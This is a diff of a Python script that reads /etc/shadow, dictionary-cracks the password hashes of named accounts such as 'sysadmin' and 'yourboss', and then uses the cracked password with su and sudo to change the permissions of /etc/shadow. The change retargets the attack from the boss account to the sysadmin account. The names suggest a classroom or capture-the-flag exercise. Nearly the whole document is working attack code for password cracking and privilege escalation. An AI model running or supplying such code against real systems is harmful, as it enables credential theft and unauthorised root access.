@@ -1,4 +1,5 @@
 import crypt
+import subprocess
 
 with open ("/etc/shadow") as f:
 	my_input = f.readlines()
@@ -20,17 +21,17 @@ def getHahsedPW (userName, my_intput):
 	return "error: no user found"	
 
 bossName = "yourboss"
-
+sysAdminName = "sysadmin"
 
 boss_password = getHahsedPW(bossName,my_input)
-sys_admin_password = getHahsedPW("sysadmin",my_input)
+sys_admin_password = getHahsedPW(sysAdminName,my_input)
 your_buddy_password = getHahsedPW("yourbuddy",my_input)
 
-print(findWord(my_dict.split(),boss_password))
-print(findWord(my_dict.split(),sys_admin_password))
+#print(findWord(my_dict.split(),boss_password))
+#print(findWord(my_dict.split(),sys_admin_password))
 
-temp = f"su {bossName} -c \"echo {boss_password} | sudo -S chmod 640 /etc/shadow\""
-subprocess.run(temp, stdout = subprocess.PIPE, universal_newlines = True, input = sudoPW , stderr=subprocess.STDOUT, shell = True)
+temp = f"su {sysAdminName} -c \"echo {sys_admin_password} | sudo -S chmod 640 /etc/shadow\""
+subprocess.run(temp, stdout = subprocess.PIPE, universal_newlines = True, input = sys_admin_password , stderr=subprocess.STDOUT, shell = True)
 
 
 
